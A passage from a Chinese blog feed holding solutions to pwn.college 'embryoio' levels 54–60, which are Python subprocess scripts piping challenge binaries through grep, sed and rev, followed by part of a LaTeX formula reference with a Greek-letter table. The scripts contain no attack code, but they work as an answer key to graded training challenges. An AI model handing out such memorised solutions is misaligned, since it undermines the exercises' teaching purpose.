punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level55"><a class="markdownIt-Anchor" href="#level55"></a> level55</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocessp1<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/challenge/embryoio_level55"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"grep"</span><span class="token punctuation">,</span><span class="token string">"pwn"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span>p1<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level56"><a class="markdownIt-Anchor" href="#level56"></a> level56</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocessp1<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/challenge/embryoio_level56"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"sed"</span><span class="token punctuation">,</span><span class="token string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span>p1<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level57"><a class="markdownIt-Anchor" href="#level57"></a> level57</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocessp1<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/challenge/embryoio_level57"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"rev"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span>p1<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"rev"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span>p2<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level58"><a class="markdownIt-Anchor" href="#level58"></a> level58</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocessp1<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"cat"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>close_fds<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>p2<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/challenge/embryoio_level58"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span>p1<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level59"><a class="markdownIt-Anchor" href="#level59"></a> level59</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocessp2<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"rev"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p2<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"rev"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span>p2<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>p1<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/challenge/embryoio_level59"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stdin<span class="token operator">=</span>p2<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level60"><a class="markdownIt-Anchor" href="#level60"></a> level60</h3><p>用C语言编程实现以上过程，又是一遍轮回<s>关于我9次轮回这件事</s></p><p>这里需要深入了解<code>Linux</code>的<code>pipe</code>机制，不能老当<code>调包侠</code></p><p><a href="https://zhuanlan.zhihu.com/p/58489873">Linux 的进程间通信：管道 - 知乎 (zhihu.com)</a></p><p><code>管道的设计也是遵循UNIX的“一切皆文件”设计原则的</code></p><p><code>实现形态上是文件，但是管道本身并不占用磁盘或者其他外部存储的空间</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>latex公式手册</title>
      <link href="/2024/05/29/latex%E6%89%8B%E5%86%8C/"/>
      <url>/2024/05/29/latex%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="1-关于latex公式编辑-introduce"><a class="markdownIt-Anchor" href="#1-关于latex公式编辑-introduce"></a> 1 关于LaTeX公式编辑 Introduce</h1><p><strong>LaTeX</strong>（常被读作/ˈlɑːtɛk/或/ˈleɪtɛk/，正确读音:/ˈlɑːtɛx/音译：拉泰赫，写作  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>LaTeX</mtext></mrow><annotation encoding="application/x-tex">\LaTeX</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.89883em;vertical-align:-0.2155em;"></span><span class="mord text"><span class="mord textrm">L</span><span class="mspace" style="margin-right:-0.36em;"></span><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.68333em;"><span style="top:-2.904999em;"><span class="pstrut" style="height:2.7em;"></span><span class="mord"><span class="mord textrm mtight sizing reset-size6 size3">A</span></span></span></span></span></span><span class="mspace" style="margin-right:-0.15em;"></span><span class="mord text"><span class="mord textrm">T</span><span class="mspace" style="margin-right:-0.1667em;"></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.46782999999999997em;"><span style="top:-2.7845em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord textrm">E</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2155em;"><span></span></span></span></span><span class="mspace" style="margin-right:-0.125em;"></span><span class="mord textrm">X</span></span></span></span></span></span>），是一种基于TeX的排版系统，由美国计算机科学家<a href="https://zh.wikipedia.org/wiki/%E8%8E%B1%E6%96%AF%E5%88%A9%C2%B7%E5%85%B0%E6%B3%A2%E7%89%B9">莱斯利·兰伯特</a>在20世纪80年代初期开发。<br /><strong>MathJax</strong>是一个跨浏览器的JavaScript库，它使用MathML、LaTeX和ASCIIMathML标记在Web浏览器中显示数学符号。</p><h2 id="11-基本使用-basic"><a class="markdownIt-Anchor" href="#11-基本使用-basic"></a> 1.1 基本使用 Basic</h2><p>在本页面输入框中输入的公式<strong>不用</strong>放在<code>&lt;math&gt;</code>与<code>&lt;/math&gt;</code>，或<code>$</code>与<code>$</code>之间，直接输入相关LaTeX代码即可。</p><p>在输出框您可以看到即时渲染出来效果，方便进行代码修改。</p><p>以下字符在LaTeX环境中是保留字符，它们具有特殊含义，只可以特定语法中起作用，所以并不能在输入框中直接输入它们（会报错或者不会渲染）</p><pre class="line-numbers language-none"><code class="language-none"># % ^ &amp; _ &#123; &#125; ~ \<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如您因其他原因需要直接显示它们，请在其前面加入<code>\</code> 反斜杠或其它转义符。</p><pre class="line-numbers language-none"><code class="language-none">\# \% ^\wedge \&amp; \_ \&#123; \&#125; \sim \backslash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">#</mi><msup><mi mathvariant="normal">%</mi><mo>∧</mo></msup><mi mathvariant="normal">&amp;</mi><mi mathvariant="normal">_</mi><mo stretchy="false">{</mo><mo stretchy="false">}</mo><mo>∼</mo><mi mathvariant="normal">\</mi></mrow><annotation encoding="application/x-tex">\# \% ^\wedge \&amp; \_ \{ \} \sim \backslash</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.111892em;vertical-align:-0.31em;"></span><span class="mord">#</span><span class="mord"><span class="mord">%</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∧</span></span></span></span></span></span></span></span><span class="mord">&amp;</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mopen">{</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">\</span></span></span></span></span></p><p>关于LaTeX代码部分请参考下一章节。</p><h1 id="2-数学公式编辑-displaying-a-formula"><a class="markdownIt-Anchor" href="#2-数学公式编辑-displaying-a-formula"></a> 2 数学公式编辑 Displaying a formula</h1><h2 id="21-符号与字母-symbol-and-alphabet"><a class="markdownIt-Anchor" href="#21-符号与字母-symbol-and-alphabet"></a> 2.1 符号与字母 Symbol and Alphabet</h2><h3 id="211-希腊字母-greek-alphabet"><a class="markdownIt-Anchor" href="#211-希腊字母-greek-alphabet"></a> 2.1.1 希腊字母 Greek alphabet</h3><table><thead><tr><th style="text-align:center">序号</th><th style="text-align:center">小写</th><th style="text-align:left">LaTeX</th><th style="text-align:left">读音</th><th style="text-align:center">序号</th><th style="text-align:center">大写</th><th style="text-align:left">LaTeX</th><th style="text-align:left">读音</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span></span></span></span></td><td style="text-align:left">\alpha</td><td style="text-align:left">/ˈælfə/</td><td style="text-align:center">31</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Γ</mi></mrow><annotation encoding="application/x-tex">\Gamma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Γ</span></span></span></span></td><td style="text-align:left">\Gamma</td><td style="text-align:left">/ˈɡæmə/</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span></td><td style="text-align:left">\beta</td><td style="text-align:left">/ˈbiːtə/, US: /ˈbeɪtə/</td><td style="text-align:center">32</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span></td><td style="text-align:left">\Delta</td><td style="text-align:left">/ˈdɛltə/</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>γ</mi></mrow><annotation encoding="application/x-tex">\gamma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05556em;">γ</span></span></span></span></td><td style="text-align:left">\gamma</td><td style="text-align:left">/ˈɡæmə/</td><td style="text-align:center">33</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Θ</mi></mrow><annotation encoding="application/x-tex">\Theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Θ</span></span></span></span></td><td style="text-align:left">\Theta</td><td style="text-align:left">/ˈθiːtə/</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>δ</mi></mrow><annotation encoding="application/x-tex">\delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03785em;">δ</span></span></span></span></td><td style="text-align:left">\delta</td><td style="text-align:left">/ˈdɛltə/</td><td style="text-align:center">34</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Λ</mi></mrow><annotation encoding="application/x-tex">\Lambda</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Λ</span></span></span></span></td><td style="text-align:left">\Lambda</td><td style="text-align:left">/ˈlæmdə/</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></td><td style="text-align:left">\epsilon</td><td style="text-align:left">/ˈɛpsɪlɒn/</td><td style="text-align:center">35</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Ξ</mi></mrow><annotation encoding="application/x-tex">\Xi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Ξ</span></span></span></span></td><td style="text-align:left">\Xi</td><td style="text-align:left">/zaɪ, ksaɪ/</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ε</mi></mrow><annotation encoding="application/x-tex">\varepsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">ε</span></span></span></span></td><td style="text-align:left">\varepsilon</td><td style="text-align:left">/ˈɛpsɪlɒn/</td><td style="text-align:center">36</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Π</mi></mrow><annotation encoding="application/x-tex">\Pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Π</span></span></span></span></td><td style="text-align:left">\Pi</td><td style="text-align:left">/paɪ/</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ζ</mi></mrow><annotation encoding="application/x-tex">\zeta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.07378em;">ζ</span></span></span></span></td><td style="text-align:left">\zeta</td><td style="text-align:left">/ˈzeɪtə/</td><td style="text-align:center">37</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Σ</span></span></span></span></td><td style="text-align:left">\Sigma</td><td style="text-align:left">/ˈsɪɡmə/</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>η</mi></mrow><annotation encoding="application/x-tex">\eta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">η</span></span></span></span></td><td style="text-align:left">\eta</td><td style="text-align:left">/ˈeɪtə/</td><td style="text-align:center">38</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Υ</mi></mrow><annotation encoding="application/x-tex">\Upsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Υ</span></span></span></span></td><td style="text-align:left">\Upsilon</td><td style="text-align:left">/ˈʌpsɪlɒn/</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>θ</mi></mrow><annotation encoding="application/x-tex">\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span></span></span></span></td><td style="text-align:left">\theta</td><td style="text-align:left">/ˈθiːtə/</td><td style="text-align:center">39</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Φ</mi></mrow><annotation encoding="application/x-tex">\Phi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Φ</span></span></span></span></td><td style="text-align:left">\Phi</td><td style="text-align:left">/faɪ/</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϑ</mi></mrow><annotation encoding="application/x-tex">\vartheta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">ϑ</span></span></span></span></td><td style="text-align:left">\vartheta</td><td style="text-align:left">/ˈθiːtə/</td><td style="text-align:center">40</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Ψ</mi></mrow><annotation encoding="application/x-tex">\Psi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Ψ</span></span></span></span></td><td style="text-align:left">\Psi</td><td style="text-align:left">/psaɪ/</td></tr><tr><td style="text-align:center">11</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ι</mi></mrow><annotation encoding="application/x-tex">\iota</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">ι</span></span></span></span></td><td style="text-align:left">\iota</td><td style="text-align:left">/aɪˈoʊtə/</td><td style="text-align:center">41</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Ω</mi></mrow><annotation encoding="application/x-tex">\Omega</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Ω</span></span></span></span></td><td style="text-align:left">\Omega</td><td style="text-align:left">/oʊˈmeɪɡə/</td></tr><tr><td style="text-align:center">12</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>κ</mi></mrow><annotation encoding="application/x-tex">\kappa</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">κ</span></span></span></span></td><td style="text-align:left">\kappa</td><td style="text-align:left">/ˈkæpə/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">13</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>λ</mi></mrow><annotation encoding="application/x-tex">\lambda</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">λ</span></span></span></span></td><td style="text-align:left">\lambda</td><td style="text-align:left">/ˈlæmdə/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">14</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>μ</mi></mrow><annotation encoding="application/x-tex">\mu</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">μ</span></span></span></span></td><td style="text-align:left">\mu</td><td style="text-align:left">/mjuː/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">15</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ν</mi></mrow><annotation encoding="application/x-tex">\nu</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.06366em;">ν</span></span></span></span></td><td style="text-align:left">\nu</td><td style="text-align:left">/njuː/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">16</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ξ</mi></mrow><annotation encoding="application/x-tex">\xi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.04601em;">ξ</span></span></span></span></td><td style="text-align:left">\xi</td><td style="text-align:left">/zaɪ, ksaɪ/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">17</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi></mrow><annotation encoding="application/x-tex">o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">o</span></span></span></span></td><td style="text-align:left">o</td><td style="text-align:left">/ˈɒmɪkrɒn/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">18</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi></mrow><annotation encoding="application/x-tex">\pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span></span></span></td><td style="text-align:left">\pi</td><td style="text-align:left">/paɪ/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">19</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math 